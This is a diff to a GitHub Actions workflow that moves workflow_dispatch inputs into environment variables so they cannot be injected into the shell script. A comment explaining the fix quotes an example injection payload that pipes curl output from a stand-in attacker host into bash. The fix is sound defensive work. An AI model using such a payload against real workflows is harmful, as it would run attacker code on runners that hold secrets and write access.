@@ -57,13 +57,27 @@ jobs:
       - name: Enrich bios in chunks, committing progress after each
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          # Passed as real env vars, not interpolated via ${{ }} into the
+          # script body — GitHub substitutes ${{ }} as literal text into the
+          # run: script BEFORE bash executes it, so a crafted workflow_dispatch
+          # input (e.g. limit or model containing `"; curl evil.example | bash;`)
+          # would execute as arbitrary shell in a runner that holds
+          # contents:write and ANTHROPIC_API_KEY — a textbook GitHub Actions
+          # script-injection pattern. env: values are passed as real process
+          # environment variables and referenced via $VARNAME, which bash
+          # treats as data, never as script text. workflow_dispatch inputs can
+          # only come from someone with write access to this repo (not an
+          # arbitrary public PR), but the fix costs nothing and removes the
+          # class entirely.
+          INPUT_LIMIT: ${{ github.event.inputs.limit }}
+          INPUT_MODEL: ${{ github.event.inputs.model }}
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
 
           CHUNK=50
-          TOTAL="${{ github.event.inputs.limit }}"
-          MODEL="${{ github.event.inputs.model }}"
+          TOTAL="$INPUT_LIMIT"
+          MODEL="$INPUT_MODEL"
           DONE=0
 
           while [ "$DONE" -lt "$TOTAL" ]; do
